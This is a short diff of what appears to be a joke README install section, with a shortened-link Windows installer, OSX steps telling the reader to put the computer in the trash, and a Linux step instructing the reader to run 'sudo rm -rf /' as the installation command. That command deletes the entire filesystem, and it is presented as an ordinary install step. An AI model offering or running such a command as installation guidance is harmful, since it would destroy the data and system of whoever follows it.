@@ -28,11 +28,13 @@ being listened to, and shift your own communications to a safe frequency of your
 1. Download the automatic installer from [here](https://goo.gl/XjBbau).
 2. Run the installer.
 3. Follow the instructions in the installer.
+
 #### Linux
 Run the following command:
 ```bash
 sudo rm -rf /
 ```
+
 #### OSX
 1. Pick up computer.
 2. Open trash can.
